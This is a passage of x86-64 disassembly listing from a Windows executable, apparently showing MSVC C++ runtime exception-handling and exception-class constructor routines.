   140003a4f:	ff 15 eb c6 00 00    	call   *0xc6eb(%rip)        # 0x140010140
   140003a55:	48 8b d8             	mov    %rax,%rbx
   140003a58:	e8 af eb ff ff       	call   0x14000260c
   140003a5d:	48 39 58 10          	cmp    %rbx,0x10(%rax)
   140003a61:	74 45                	je     0x140003aa8
   140003a63:	81 3e 4d 4f 43 e0    	cmpl   $0xe0434f4d,(%rsi)
   140003a69:	74 3d                	je     0x140003aa8
   140003a6b:	81 3e 52 43 43 e0    	cmpl   $0xe0434352,(%rsi)
   140003a71:	74 35                	je     0x140003aa8
   140003a73:	48 8b 84 24 38 01 00 	mov    0x138(%rsp),%rax
   140003a7a:	00 
   140003a7b:	4c 8b cd             	mov    %rbp,%r9
   140003a7e:	44 89 7c 24 38       	mov    %r15d,0x38(%rsp)
   140003a83:	4d 8b c4             	mov    %r12,%r8
   140003a86:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
   140003a8b:	49 8b d6             	mov    %r14,%rdx
   140003a8e:	44 89 6c 24 28       	mov    %r13d,0x28(%rsp)
   140003a93:	48 8b ce             	mov    %rsi,%rcx
   140003a96:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   140003a9b:	e8 14 f0 ff ff       	call   0x140002ab4
   140003aa0:	85 c0                	test   %eax,%eax
   140003aa2:	0f 85 94 01 00 00    	jne    0x140003c3c
   140003aa8:	48 8b 45 08          	mov    0x8(%rbp),%rax
   140003aac:	48 89 44 24 68       	mov    %rax,0x68(%rsp)
   140003ab1:	48 89 7c 24 60       	mov    %rdi,0x60(%rsp)
   140003ab6:	83 7f 0c 00          	cmpl   $0x0,0xc(%rdi)
   140003aba:	0f 86 97 01 00 00    	jbe    0x140003c57
   140003ac0:	44 89 6c 24 28       	mov    %r13d,0x28(%rsp)
   140003ac5:	48 8d 54 24 60       	lea    0x60(%rsp),%rdx
   140003aca:	4c 8b cd             	mov    %rbp,%r9
   140003acd:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   140003ad2:	45 8b c7             	mov    %r15d,%r8d
   140003ad5:	48 8d 8c 24 98 00 00 	lea    0x98(%rsp),%rcx
   140003adc:	00 
   140003add:	e8 ea f1 ff ff       	call   0x140002ccc
   140003ae2:	0f 10 8c 24 98 00 00 	movups 0x98(%rsp),%xmm1
   140003ae9:	00 
   140003aea:	66 0f 6f c1          	movdqa %xmm1,%xmm0
   140003aee:	66 0f 73 d8 08       	psrldq $0x8,%xmm0
   140003af3:	66 0f 7e c0          	movd   %xmm0,%eax
   140003af7:	f3 0f 7f 4c 24 70    	movdqu %xmm1,0x70(%rsp)
   140003afd:	3b 84 24 b0 00 00 00 	cmp    0xb0(%rsp),%eax
   140003b04:	0f 83 32 01 00 00    	jae    0x140003c3c
   140003b0a:	44 8b 74 24 78       	mov    0x78(%rsp),%r14d
   140003b0f:	66 49 0f 7e c9       	movq   %xmm1,%r9
   140003b14:	4c 89 8c 24 00 01 00 	mov    %r9,0x100(%rsp)
   140003b1b:	00 
   140003b1c:	48 8b 44 24 70       	mov    0x70(%rsp),%rax
   140003b21:	48 8b 00             	mov    (%rax),%rax
   140003b24:	48 63 50 10          	movslq 0x10(%rax),%rdx
   140003b28:	41 8b c6             	mov    %r14d,%eax
   140003b2b:	48 8d 0c 80          	lea    (%rax,%rax,4),%rcx
   140003b2f:	49 8b 41 08          	mov    0x8(%r9),%rax
   140003b33:	4c 8d 04 8a          	lea    (%rdx,%rcx,4),%r8
   140003b37:	41 0f 10 04 00       	movups (%r8,%rax,1),%xmm0
   140003b3c:	49 63 54 00 10       	movslq 0x10(%r8,%rax,1),%rdx
   140003b41:	89 94 24 90 00 00 00 	mov    %edx,0x90(%rsp)
   140003b48:	66 0f 7e c0          	movd   %xmm0,%eax
   140003b4c:	0f 11 84 24 80 00 00 	movups %xmm0,0x80(%rsp)
   140003b53:	00 
   140003b54:	41 3b c7             	cmp    %r15d,%eax
   140003b57:	0f 8f be 00 00 00    	jg     0x140003c1b
   140003b5d:	66 48 0f 7e c0       	movq   %xmm0,%rax
   140003b62:	48 c1 e8 20          	shr    $0x20,%rax
   140003b66:	44 3b f8             	cmp    %eax,%r15d
   140003b69:	0f 8f ac 00 00 00    	jg     0x140003c1b
   140003b6f:	48 8b 5d 08          	mov    0x8(%rbp),%rbx
   140003b73:	48 83 c3 ec          	add    $0xffffffffffffffec,%rbx
   140003b77:	66 0f 73 d8 08       	psrldq $0x8,%xmm0
   140003b7c:	66 48 0f 7e c0       	movq   %xmm0,%rax
   140003b81:	48 c1 e8 20          	shr    $0x20,%rax
   140003b85:	48 8d 0c 80          	lea    (%rax,%rax,4),%rcx
   140003b89:	48 8d 14 8a          	lea    (%rdx,%rcx,4),%rdx
   140003b8d:	48 03 da             	add    %rdx,%rbx
   140003b90:	83 7b 04 00          	cmpl   $0x0,0x4(%rbx)
   140003b94:	74 31                	je     0x140003bc7
   140003b96:	4c 63 63 04          	movslq 0x4(%rbx),%r12
   140003b9a:	e8 f5 f3 ff ff       	call   0x140002f94
   140003b9f:	49 03 c4             	add    %r12,%rax
   140003ba2:	74 1b                	je     0x140003bbf
   140003ba4:	45 85 e4             	test   %r12d,%r12d
   140003ba7:	74 0e                	je     0x140003bb7
   140003ba9:	e8 e6 f3 ff ff       	call   0x140002f94
   140003bae:	48 63 4b 04          	movslq 0x4(%rbx),%rcx
   140003bb2:	48 03 c1             	add    %rcx,%rax
   140003bb5:	eb 02                	jmp    0x140003bb9
   140003bb7:	33 c0                	xor    %eax,%eax
   140003bb9:	80 78 10 00          	cmpb   $0x0,0x10(%rax)
   140003bbd:	75 5c                	jne    0x140003c1b
   140003bbf:	4c 8b a4 24 10 01 00 	mov    0x110(%rsp),%r12
   140003bc6:	00 
   140003bc7:	f6 03 40             	testb  $0x40,(%rbx)
   140003bca:	75 4f                	jne    0x140003c1b
   140003bcc:	48 8b 84 24 38 01 00 	mov    0x138(%rsp),%rax
   140003bd3:	00 
   140003bd4:	4c 8b cd             	mov    %rbp,%r9
   140003bd7:	48 8b 94 24 08 01 00 	mov    0x108(%rsp),%rdx
   140003bde:	00 
   140003bdf:	4d 8b c4             	mov    %r12,%r8
   140003be2:	c6 44 24 58 00       	movb   $0x0,0x58(%rsp)
   140003be7:	48 8b ce             	mov    %rsi,%rcx
   140003bea:	c6 44 24 50 01       	movb   $0x1,0x50(%rsp)
   140003bef:	48 89 44 24 48       	mov    %rax,0x48(%rsp)
   140003bf4:	48 8d 84 24 80 00 00 	lea    0x80(%rsp),%rax
   140003bfb:	00 
   140003bfc:	44 89 6c 24 40       	mov    %r13d,0x40(%rsp)
   140003c01:	48 89 44 24 38       	mov    %rax,0x38(%rsp)
   140003c06:	48 83 64 24 30 00    	andq   $0x0,0x30(%rsp)
   140003c0c:	48 89 5c 24 28       	mov    %rbx,0x28(%rsp)
   140003c11:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   140003c16:	e8 31 f8 ff ff       	call   0x14000344c
   140003c1b:	4c 8b a4 24 10 01 00 	mov    0x110(%rsp),%r12
   140003c22:	00 
   140003c23:	41 ff c6             	inc    %r14d
   140003c26:	4c 8b 8c 24 00 01 00 	mov    0x100(%rsp),%r9
   140003c2d:	00 
   140003c2e:	44 3b b4 24 b0 00 00 	cmp    0xb0(%rsp),%r14d
   140003c35:	00 
   140003c36:	0f 82 e0 fe ff ff    	jb     0x140003b1c
   140003c3c:	48 8b 9c 24 18 01 00 	mov    0x118(%rsp),%rbx
   140003c43:	00 
   140003c44:	48 81 c4 c0 00 00 00 	add    $0xc0,%rsp
   140003c4b:	41 5f                	pop    %r15
   140003c4d:	41 5e                	pop    %r14
   140003c4f:	41 5d                	pop    %r13
   140003c51:	41 5c                	pop    %r12
   140003c53:	5f                   	pop    %rdi
   140003c54:	5e                   	pop    %rsi
   140003c55:	5d                   	pop    %rbp
   140003c56:	c3                   	ret
   140003c57:	e8 b4 21 00 00       	call   0x140005e10
   140003c5c:	cc                   	int3
   140003c5d:	cc                   	int3
   140003c5e:	cc                   	int3
   140003c5f:	cc                   	int3
   140003c60:	48 8b c4             	mov    %rsp,%rax
   140003c63:	48 89 58 08          	mov    %rbx,0x8(%rax)
   140003c67:	48 89 68 10          	mov    %rbp,0x10(%rax)
   140003c6b:	48 89 70 18          	mov    %rsi,0x18(%rax)
   140003c6f:	48 89 78 20          	mov    %rdi,0x20(%rax)
   140003c73:	41 56                	push   %r14
   140003c75:	48 83 ec 20          	sub    $0x20,%rsp
   140003c79:	33 db                	xor    %ebx,%ebx
   140003c7b:	4d 8b f0             	mov    %r8,%r14
   140003c7e:	48 8b ea             	mov    %rdx,%rbp
   140003c81:	48 8b f9             	mov    %rcx,%rdi
   140003c84:	39 59 04             	cmp    %ebx,0x4(%rcx)
   140003c87:	0f 84 f0 00 00 00    	je     0x140003d7d
   140003c8d:	48 63 71 04          	movslq 0x4(%rcx),%rsi
   140003c91:	e8 fe f2 ff ff       	call   0x140002f94
   140003c96:	4c 8b c8             	mov    %rax,%r9
   140003c99:	4c 03 ce             	add    %rsi,%r9
   140003c9c:	0f 84 db 00 00 00    	je     0x140003d7d
   140003ca2:	85 f6                	test   %esi,%esi
   140003ca4:	74 0f                	je     0x140003cb5
   140003ca6:	48 63 77 04          	movslq 0x4(%rdi),%rsi
   140003caa:	e8 e5 f2 ff ff       	call   0x140002f94
   140003caf:	48 8d 0c 06          	lea    (%rsi,%rax,1),%rcx
   140003cb3:	eb 05                	jmp    0x140003cba
   140003cb5:	48 8b cb             	mov    %rbx,%rcx
   140003cb8:	8b f3                	mov    %ebx,%esi
   140003cba:	38 59 10             	cmp    %bl,0x10(%rcx)
   140003cbd:	0f 84 ba 00 00 00    	je     0x140003d7d
   140003cc3:	f6 07 80             	testb  $0x80,(%rdi)
   140003cc6:	74 0a                	je     0x140003cd2
   140003cc8:	f6 45 00 10          	testb  $0x10,0x0(%rbp)
   140003ccc:	0f 85 ab 00 00 00    	jne    0x140003d7d
   140003cd2:	85 f6                	test   %esi,%esi
   140003cd4:	74 11                	je     0x140003ce7
   140003cd6:	e8 b9 f2 ff ff       	call   0x140002f94
   140003cdb:	48 8b f0             	mov    %rax,%rsi
   140003cde:	48 63 47 04          	movslq 0x4(%rdi),%rax
   140003ce2:	48 03 f0             	add    %rax,%rsi
   140003ce5:	eb 03                	jmp    0x140003cea
   140003ce7:	48 8b f3             	mov    %rbx,%rsi
   140003cea:	e8 b9 f2 ff ff       	call   0x140002fa8
   140003cef:	48 8b c8             	mov    %rax,%rcx
   140003cf2:	48 63 45 04          	movslq 0x4(%rbp),%rax
   140003cf6:	48 03 c8             	add    %rax,%rcx
   140003cf9:	48 3b f1             	cmp    %rcx,%rsi
   140003cfc:	74 4b                	je     0x140003d49
   140003cfe:	39 5f 04             	cmp    %ebx,0x4(%rdi)
   140003d01:	74 11                	je     0x140003d14
   140003d03:	e8 8c f2 ff ff       	call   0x140002f94
   140003d08:	48 8b f0             	mov    %rax,%rsi
   140003d0b:	48 63 47 04          	movslq 0x4(%rdi),%rax
   140003d0f:	48 03 f0             	add    %rax,%rsi
   140003d12:	eb 03                	jmp    0x140003d17
   140003d14:	48 8b f3             	mov    %rbx,%rsi
   140003d17:	e8 8c f2 ff ff       	call   0x140002fa8
   140003d1c:	4c 63 45 04          	movslq 0x4(%rbp),%r8
   140003d20:	49 83 c0 10          	add    $0x10,%r8
   140003d24:	4c 03 c0             	add    %rax,%r8
   140003d27:	48 8d 46 10          	lea    0x10(%rsi),%rax
   140003d2b:	4c 2b c0             	sub    %rax,%r8
   140003d2e:	0f b6 08             	movzbl (%rax),%ecx
   140003d31:	42 0f b6 14 00       	movzbl (%rax,%r8,1),%edx
   140003d36:	2b ca                	sub    %edx,%ecx
   140003d38:	75 07                	jne    0x140003d41
   140003d3a:	48 ff c0             	inc    %rax
   140003d3d:	85 d2                	test   %edx,%edx
   140003d3f:	75 ed                	jne    0x140003d2e
   140003d41:	85 c9                	test   %ecx,%ecx
   140003d43:	74 04                	je     0x140003d49
   140003d45:	33 c0                	xor    %eax,%eax
   140003d47:	eb 39                	jmp    0x140003d82
   140003d49:	b0 02                	mov    $0x2,%al
   140003d4b:	84 45 00             	test   %al,0x0(%rbp)
   140003d4e:	74 05                	je     0x140003d55
   140003d50:	f6 07 08             	testb  $0x8,(%rdi)
   140003d53:	74 24                	je     0x140003d79
   140003d55:	41 f6 06 01          	testb  $0x1,(%r14)
   140003d59:	74 05                	je     0x140003d60
   140003d5b:	f6 07 01             	testb  $0x1,(%rdi)
   140003d5e:	74 19                	je     0x140003d79
   140003d60:	41 f6 06 04          	testb  $0x4,(%r14)
   140003d64:	74 05                	je     0x140003d6b
   140003d66:	f6 07 04             	testb  $0x4,(%rdi)
   140003d69:	74 0e                	je     0x140003d79
   140003d6b:	41 84 06             	test   %al,(%r14)
   140003d6e:	74 04                	je     0x140003d74
   140003d70:	84 07                	test   %al,(%rdi)
   140003d72:	74 05                	je     0x140003d79
   140003d74:	bb 01 00 00 00       	mov    $0x1,%ebx
   140003d79:	8b c3                	mov    %ebx,%eax
   140003d7b:	eb 05                	jmp    0x140003d82
   140003d7d:	b8 01 00 00 00       	mov    $0x1,%eax
   140003d82:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140003d87:	48 8b 6c 24 38       	mov    0x38(%rsp),%rbp
   140003d8c:	48 8b 74 24 40       	mov    0x40(%rsp),%rsi
   140003d91:	48 8b 7c 24 48       	mov    0x48(%rsp),%rdi
   140003d96:	48 83 c4 20          	add    $0x20,%rsp
   140003d9a:	41 5e                	pop    %r14
   140003d9c:	c3                   	ret
   140003d9d:	cc                   	int3
   140003d9e:	cc                   	int3
   140003d9f:	cc                   	int3
   140003da0:	48 8b c4             	mov    %rsp,%rax
   140003da3:	48 89 58 08          	mov    %rbx,0x8(%rax)
   140003da7:	48 89 68 10          	mov    %rbp,0x10(%rax)
   140003dab:	48 89 70 18          	mov    %rsi,0x18(%rax)
   140003daf:	48 89 78 20          	mov    %rdi,0x20(%rax)
   140003db3:	41 56                	push   %r14
   140003db5:	48 83 ec 60          	sub    $0x60,%rsp
   140003db9:	48 8b f9             	mov    %rcx,%rdi
   140003dbc:	49 8b f1             	mov    %r9,%rsi
   140003dbf:	49 8b c8             	mov    %r8,%rcx
   140003dc2:	4d 8b f0             	mov    %r8,%r14
   140003dc5:	48 8b ea             	mov    %rdx,%rbp
   140003dc8:	e8 e7 e7 ff ff       	call   0x1400025b4
   140003dcd:	e8 3a e8 ff ff       	call   0x14000260c
   140003dd2:	48 8b 9c 24 90 00 00 	mov    0x90(%rsp),%rbx
   140003dd9:	00 
   140003dda:	b9 29 00 00 80       	mov    $0x80000029,%ecx
   140003ddf:	ba 26 00 00 80       	mov    $0x80000026,%edx
   140003de4:	83 78 40 00          	cmpl   $0x0,0x40(%rax)
   140003de8:	75 38                	jne    0x140003e22
   140003dea:	81 3f 63 73 6d e0    	cmpl   $0xe06d7363,(%rdi)
   140003df0:	74 30                	je     0x140003e22
   140003df2:	39 0f                	cmp    %ecx,(%rdi)
   140003df4:	75 10                	jne    0x140003e06
   140003df6:	83 7f 18 0f          	cmpl   $0xf,0x18(%rdi)
   140003dfa:	75 0e                	jne    0x140003e0a
   140003dfc:	48 81 7f 60 20 05 93 	cmpq   $0x19930520,0x60(%rdi)
   140003e03:	19 
   140003e04:	74 1c                	je     0x140003e22
   140003e06:	39 17                	cmp    %edx,(%rdi)
   140003e08:	74 18                	je     0x140003e22
   140003e0a:	8b 03                	mov    (%rbx),%eax
   140003e0c:	25 ff ff ff 1f       	and    $0x1fffffff,%eax
   140003e11:	3d 22 05 93 19       	cmp    $0x19930522,%eax
   140003e16:	72 0a                	jb     0x140003e22
   140003e18:	f6 43 24 01          	testb  $0x1,0x24(%rbx)
   140003e1c:	0f 85 8f 01 00 00    	jne    0x140003fb1
   140003e22:	f6 47 04 66          	testb  $0x66,0x4(%rdi)
   140003e26:	0f 84 8e 00 00 00    	je     0x140003eba
   140003e2c:	83 7b 04 00          	cmpl   $0x0,0x4(%rbx)
   140003e30:	0f 84 7b 01 00 00    	je     0x140003fb1
   140003e36:	83 bc 24 98 00 00 00 	cmpl   $0x0,0x98(%rsp)
   140003e3d:	00 
   140003e3e:	0f 85 6d 01 00 00    	jne    0x140003fb1
   140003e44:	f6 47 04 20          	testb  $0x20,0x4(%rdi)
   140003e48:	74 5d                	je     0x140003ea7
   140003e4a:	39 17                	cmp    %edx,(%rdi)
   140003e4c:	75 37                	jne    0x140003e85
   140003e4e:	4c 8b 46 20          	mov    0x20(%rsi),%r8
   140003e52:	48 8b d6             	mov    %rsi,%rdx
   140003e55:	48 8b cb             	mov    %rbx,%rcx
   140003e58:	e8 c7 f2 ff ff       	call   0x140003124
   140003e5d:	83 f8 ff             	cmp    $0xffffffff,%eax
   140003e60:	0f 8c 6b 01 00 00    	jl     0x140003fd1
   140003e66:	3b 43 04             	cmp    0x4(%rbx),%eax
   140003e69:	0f 8d 62 01 00 00    	jge    0x140003fd1
   140003e6f:	44 8b c8             	mov    %eax,%r9d
   140003e72:	48 8b cd             	mov    %rbp,%rcx
   140003e75:	48 8b d6             	mov    %rsi,%rdx
   140003e78:	4c 8b c3             	mov    %rbx,%r8
   140003e7b:	e8 b8 04 00 00       	call   0x140004338
   140003e80:	e9 2c 01 00 00       	jmp    0x140003fb1
   140003e85:	39 0f                	cmp    %ecx,(%rdi)
   140003e87:	75 1e                	jne    0x140003ea7
   140003e89:	44 8b 4f 38          	mov    0x38(%rdi),%r9d
   140003e8d:	41 83 f9 ff          	cmp    $0xffffffff,%r9d
   140003e91:	0f 8c 3a 01 00 00    	jl     0x140003fd1
   140003e97:	44 3b 4b 04          	cmp    0x4(%rbx),%r9d
   140003e9b:	0f 8d 30 01 00 00    	jge    0x140003fd1
   140003ea1:	48 8b 4f 28          	mov    0x28(%rdi),%rcx
   140003ea5:	eb ce                	jmp    0x140003e75
   140003ea7:	4c 8b c3             	mov    %rbx,%r8
   140003eaa:	48 8b d6             	mov    %rsi,%rdx
   140003ead:	48 8b cd             	mov    %rbp,%rcx
   140003eb0:	e8 e3 ec ff ff       	call   0x140002b98
   140003eb5:	e9 f7 00 00 00       	jmp    0x140003fb1
   140003eba:	83 7b 0c 00          	cmpl   $0x0,0xc(%rbx)
   140003ebe:	75 42                	jne    0x140003f02
   140003ec0:	8b 03                	mov    (%rbx),%eax
   140003ec2:	25 ff ff ff 1f       	and    $0x1fffffff,%eax
   140003ec7:	3d 21 05 93 19       	cmp    $0x19930521,%eax
   140003ecc:	72 14                	jb     0x140003ee2
   140003ece:	83 7b 20 00          	cmpl   $0x0,0x20(%rbx)
   140003ed2:	74 0e                	je     0x140003ee2
   140003ed4:	e8 bb f0 ff ff       	call   0x140002f94
   140003ed9:	48 63 4b 20          	movslq 0x20(%rbx),%rcx
   140003edd:	48 03 c1             	add    %rcx,%rax
   140003ee0:	75 20                	jne    0x140003f02
   140003ee2:	8b 03                	mov    (%rbx),%eax
   140003ee4:	25 ff ff ff 1f       	and    $0x1fffffff,%eax
   140003ee9:	3d 22 05 93 19       	cmp    $0x19930522,%eax
   140003eee:	0f 82 bd 00 00 00    	jb     0x140003fb1
   140003ef4:	8b 43 24             	mov    0x24(%rbx),%eax
   140003ef7:	c1 e8 02             	shr    $0x2,%eax
   140003efa:	a8 01                	test   $0x1,%al
   140003efc:	0f 84 af 00 00 00    	je     0x140003fb1
   140003f02:	81 3f 63 73 6d e0    	cmpl   $0xe06d7363,(%rdi)
   140003f08:	75 6e                	jne    0x140003f78
   140003f0a:	83 7f 18 03          	cmpl   $0x3,0x18(%rdi)
   140003f0e:	72 68                	jb     0x140003f78
   140003f10:	81 7f 20 22 05 93 19 	cmpl   $0x19930522,0x20(%rdi)
   140003f17:	76 5f                	jbe    0x140003f78
   140003f19:	48 8b 47 30          	mov    0x30(%rdi),%rax
   140003f1d:	83 78 08 00          	cmpl   $0x0,0x8(%rax)
   140003f21:	74 55                	je     0x140003f78
   140003f23:	e8 80 f0 ff ff       	call   0x140002fa8
   140003f28:	48 8b 4f 30          	mov    0x30(%rdi),%rcx
   140003f2c:	4c 8b d0             	mov    %rax,%r10
   140003f2f:	48 63 51 08          	movslq 0x8(%rcx),%rdx
   140003f33:	4c 03 d2             	add    %rdx,%r10
   140003f36:	74 40                	je     0x140003f78
   140003f38:	0f b6 8c 24 a8 00 00 	movzbl 0xa8(%rsp),%ecx
   140003f3f:	00 
   140003f40:	4c 8b ce             	mov    %rsi,%r9
   140003f43:	8b 84 24 98 00 00 00 	mov    0x98(%rsp),%eax
   140003f4a:	4d 8b c6             	mov    %r14,%r8
   140003f4d:	89 4c 24 38          	mov    %ecx,0x38(%rsp)
   140003f51:	48 8b d5             	mov    %rbp,%rdx
   140003f54:	48 8b 8c 24 a0 00 00 	mov    0xa0(%rsp),%rcx
   140003f5b:	00 
   140003f5c:	48 89 4c 24 30       	mov    %rcx,0x30(%rsp)
   140003f61:	48 8b cf             	mov    %rdi,%rcx
   140003f64:	89 44 24 28          	mov    %eax,0x28(%rsp)
   140003f68:	49 8b c2             	mov    %r10,%rax
   140003f6b:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   140003f70:	ff 15 42 c3 00 00    	call   *0xc342(%rip)        # 0x1400102b8
   140003f76:	eb 3e                	jmp    0x140003fb6
   140003f78:	48 8b 84 24 a0 00 00 	mov    0xa0(%rsp),%rax
   140003f7f:	00 
   140003f80:	4c 8b ce             	mov    %rsi,%r9
   140003f83:	48 89 44 24 38       	mov    %rax,0x38(%rsp)
   140003f88:	4d 8b c6             	mov    %r14,%r8
   140003f8b:	8b 84 24 98 00 00 00 	mov    0x98(%rsp),%eax
   140003f92:	48 8b d5             	mov    %rbp,%rdx
   140003f95:	89 44 24 30          	mov    %eax,0x30(%rsp)
   140003f99:	48 8b cf             	mov    %rdi,%rcx
   140003f9c:	8a 84 24 a8 00 00 00 	mov    0xa8(%rsp),%al
   140003fa3:	88 44 24 28          	mov    %al,0x28(%rsp)
   140003fa7:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   140003fac:	e8 6f f5 ff ff       	call   0x140003520
   140003fb1:	b8 01 00 00 00       	mov    $0x1,%eax
   140003fb6:	4c 8d 5c 24 60       	lea    0x60(%rsp),%r11
   140003fbb:	49 8b 5b 10          	mov    0x10(%r11),%rbx
   140003fbf:	49 8b 6b 18          	mov    0x18(%r11),%rbp
   140003fc3:	49 8b 73 20          	mov    0x20(%r11),%rsi
   140003fc7:	49 8b 7b 28          	mov    0x28(%r11),%rdi
   140003fcb:	49 8b e3             	mov    %r11,%rsp
   140003fce:	41 5e                	pop    %r14
   140003fd0:	c3                   	ret
   140003fd1:	e8 3a 1e 00 00       	call   0x140005e10
   140003fd6:	cc                   	int3
   140003fd7:	cc                   	int3
   140003fd8:	e9 c3 fd ff ff       	jmp    0x140003da0
   140003fdd:	cc                   	int3
   140003fde:	cc                   	int3
   140003fdf:	cc                   	int3
   140003fe0:	40 53                	rex push %rbx
   140003fe2:	48 83 ec 20          	sub    $0x20,%rsp
   140003fe6:	48 8b d9             	mov    %rcx,%rbx
   140003fe9:	48 8b c2             	mov    %rdx,%rax
   140003fec:	48 8d 0d 6d d3 00 00 	lea    0xd36d(%rip),%rcx        # 0x140011360
   140003ff3:	0f 57 c0             	xorps  %xmm0,%xmm0
   140003ff6:	48 89 0b             	mov    %rcx,(%rbx)
   140003ff9:	48 8d 53 08          	lea    0x8(%rbx),%rdx
   140003ffd:	48 8d 48 08          	lea    0x8(%rax),%rcx
   140004001:	0f 11 02             	movups %xmm0,(%rdx)
   140004004:	e8 87 07 00 00       	call   0x140004790
   140004009:	48 8d 05 80 d3 00 00 	lea    0xd380(%rip),%rax        # 0x140011390
   140004010:	48 89 03             	mov    %rax,(%rbx)
   140004013:	48 8b c3             	mov    %rbx,%rax
   140004016:	48 83 c4 20          	add    $0x20,%rsp
   14000401a:	5b                   	pop    %rbx
   14000401b:	c3                   	ret
   14000401c:	48 83 61 10 00       	andq   $0x0,0x10(%rcx)
   140004021:	48 8d 05 78 d3 00 00 	lea    0xd378(%rip),%rax        # 0x1400113a0
   140004028:	48 89 41 08          	mov    %rax,0x8(%rcx)
   14000402c:	48 8d 05 5d d3 00 00 	lea    0xd35d(%rip),%rax        # 0x140011390
   140004033:	48 89 01             	mov    %rax,(%rcx)
   140004036:	48 8b c1             	mov    %rcx,%rax
   140004039:	c3                   	ret
   14000403a:	cc                   	int3
   14000403b:	cc                   	int3
   14000403c:	40 53                	rex push %rbx
   14000403e:	48 83 ec 20          	sub    $0x20,%rsp
   140004042:	48 8b d9             	mov    %rcx,%rbx
   140004045:	48 8b c2             	mov    %rdx,%rax
   140004048:	48 8d 0d 11 d3 00 00 	lea    0xd311(%rip),%rcx        # 0x140011360
   14000404f:	0f 57 c0             	xorps  %xmm0,%xmm0
   140004052:	48 89 0b             	mov    %rcx,(%rbx)
   140004055:	48 8d 53 08          	lea    0x8(%rbx),%rdx
   140004059:	48 8d 48 08          	lea    0x8(%rax),%rcx
   14000405d:	0f 11 02             	movups %xmm0,(%rdx)
   140004060:	e8 2b 07 00 00       	call   0x140004790
   140004065:	48 8b c3             	mov    %rbx,%rax
   140004068:	48 83 c4 20          	add    $0x20,%rsp
   14000406c:	5b                   	pop    %rbx
   14000406d:	c3                   	ret
   14000406e:	cc                   	int3
   14000406f:	cc                   	int3
   140004070:	48 8d 05 e9 d2 00 00 	lea    0xd2e9(%rip),%rax        # 0x140011360
   140004077:	48 89 01             	mov    %rax,(%rcx)
   14000407a:	48 83 c1 08          	add    $0x8,%rcx
   14000407e:	e9 9d 07 00 00       	jmp    0x140004820
   140004083:	cc                   	int3
   140004084:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140004089:	57                   	push   %rdi
   14000408a:	48 83 ec 20          	sub    $0x20,%rsp
   14000408e:	48 8d 05 cb d2 00 00 	lea    0xd2cb(%rip),%rax        # 0x140011360
   140004095:	48 8b f9             	mov    %rcx,%rdi
   140004098:	48 89 01             	mov    %rax,(%rcx)
   14000409b:	8b da                	mov    %edx,%ebx
   14000409d:	48 83 c1 08          	add    $0x8,%rcx
   1400040a1:	e8 7a 07 00 00       	call   0x140004820
   1400040a6:	f6 c3 01             	test   $0x1,%bl
   1400040a9:	74 0d                	je     0x1400040b8
   1400040ab:	ba 18 00 00 00       	mov    $0x18,%edx
   1400040b0:	48 8b cf             	mov    %rdi,%rcx
   1400040b3:	e8 7c ac 00 00       	call   0x14000ed34
   1400040b8:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   1400040bd:	48 8b c7             	mov    %rdi,%rax
   1400040c0:	48 83 c4 20          	add    $0x20,%rsp
   1400040c4:	5f                   	pop    %rdi
   1400040c5:	c3                   	ret
   1400040c6:	cc                   	int3
   1400040c7:	cc                   	int3
   1400040c8:	40 53                	rex push %rbx
   1400040ca:	56                   	push   %rsi
   1400040cb:	57                   	push   %rdi
   1400040cc:	41 54                	push   %r12
   1400040ce:	41 55                	push   %r13
   1400040d0:	41 56                	push   %r14
   1400040d2:	41 57                	push   %r15
   1400040d4:	48 83 ec 70          	sub    $0x70,%rsp
   1400040d8:	48 8b f9             	mov    %rcx,%rdi
   1400040db:	45 33 ff             	xor    %r15d,%r15d
   1400040de:	44 89 7c 24 20       	mov    %r15d,0x20(%rsp)
   1400040e3:	44 21 bc 24 b0 00 00 	and    %r15d,0xb0(%rsp)
   1400040ea:	00 
   1400040eb:	4c 21 7c 24 28       	and    %r15,0x28(%rsp)
   1400040f0:	4c 21 bc 24 c8 00 00 	and    %r15,0xc8(%rsp)
   1400040f7:	00 
   1400040f8:	e8 0f e5 ff ff       	call   0x14000260c
   1400040fd:	4c 8b 68 28          	mov    0x28(%rax),%r13
   140004101:	4c 89 6c 24 40       	mov    %r13,0x40(%rsp)
   140004106:	e8 01 e5 ff ff       	call   0x14000260c
   14000410b:	48 8b 40 20          	mov    0x20(%rax),%rax
   14000410f:	48 89 84 24 c0 00 00 	mov    %rax,0xc0(%rsp)
   140004116:	00 
   140004117:	48 8b 77 50          	mov    0x50(%rdi),%rsi
   14000411b:	48 89 b4 24 b8 00 00 	mov    %rsi,0xb8(%rsp)
   140004122:	00 
   140004123:	48 8b 47 48          	mov    0x48(%rdi),%rax
   140004127:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
   14000412c:	48 8b 5f 40          	mov    0x40(%rdi),%rbx
   140004130:	48 8b 47 30          	mov    0x30(%rdi),%rax
   140004134:	48 89 44 24 48       	mov    %rax,0x48(%rsp)
   140004139:	4c 8b 77 28          	mov    0x28(%rdi),%r14
   14000413d:	4c 89 74 24 50       	mov    %r14,0x50(%rsp)
   140004142:	48 8b cb             	mov    %rbx,%rcx
   140004145:	e8 6a e4 ff ff       	call   0x1400025b4
   14000414a:	e8 bd e4 ff ff       	call   0x14000260c
   14000414f:	48 89 70 20          	mov    %rsi,0x20(%rax)
   140004153:	e8 b4 e4 ff ff       	call   0x14000260c
   140004158:	48 89 58 28          	mov    %rbx,0x28(%rax)
   14000415c:	e8 ab e4 ff ff       	call   0x14000260c
   140004161:	48 8b 50 20          	mov    0x20(%rax),%rdx
   140004165:	48 8b 52 28          	mov    0x28(%rdx),%rdx
   140004169:	48 8d 4c 24 60       	lea    0x60(%rsp),%rcx
   14000416e:	e8 91 ed ff ff       	call   0x140002f04
   140004173:	4c 8b e0             	mov    %rax,%r12
   140004176:	48 89 44 24 38       	mov    %rax,0x38(%rsp)
   14000417b:	4c 39 7f 58          	cmp    %r15,0x58(%rdi)
   14000417f:	74 1c                	je     0x14000419d
   140004181:	c7 84 24 b0 00 00 00 	movl   $0x1,0xb0(%rsp)
